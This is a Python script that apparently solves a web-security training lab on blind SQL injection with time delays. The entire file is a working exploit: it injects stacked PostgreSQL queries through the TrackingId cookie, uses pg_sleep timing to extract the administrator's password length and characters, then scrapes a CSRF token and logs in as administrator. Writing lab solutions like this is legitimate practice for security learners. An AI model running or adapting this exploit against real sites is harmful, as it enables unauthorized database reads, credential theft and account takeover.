# name of the lab
# Lab: Blind SQL injection with time delays and information retrieval
import requests
from time import sleep
from bs4 import BeautifulSoup


def blindTime(url):
    s = "0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ"
    number = 1
    session = requests.Session()
    response = session.get(url)
    track = session.cookies.get_dict()["TrackingId"]
    trackingID = track + "'%3BSELECT+CASE+WHEN+(username='administrator')+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END+FROM+users--"
    resp = session.get(url, cookies={'TrackingId': trackingID})
    if not resp.elapsed.seconds > 8:
        return 0
    for a in range(1, 40):
        trackingID = track + "'%3BSELECT+CASE+WHEN+(username='administrator'+AND+LENGTH(password)>" + str(number) + ")+THEN+pg_sleep(4)+ELSE+pg_sleep(0)+END+FROM+users--"
        response = requests.get(url, cookies={'TrackingId': trackingID})
        if response.elapsed.seconds > 3:
            number += 1
        else:
            break
    password = ""
    for num in range(1, number + 1):
        for letter in s:
            trackingID = track + "'%3BSELECT+CASE+WHEN+(username='administrator'+AND+SUBSTRING(password,"+str(num)+",1)='"+str(letter)+"')+THEN+pg_sleep(4)+ELSE+pg_sleep(0)+END+FROM+users--"
            response = requests.get(url, cookies={'TrackingId': trackingID})
            if response.elapsed.seconds > 3:
                password += letter
                print(letter)
    url1 = url + "login"
    session = requests.session()
    resp1 = session.get(url1).text
    soup = BeautifulSoup(resp1, "html.parser")
    csrf = soup.find('input', {'name': 'csrf'})['value']
    response = session.post(url1, data={"username": "administrator", "password": password, "csrf": csrf})
    if "logout" in response.text:
        return 1
    else:
        return 0
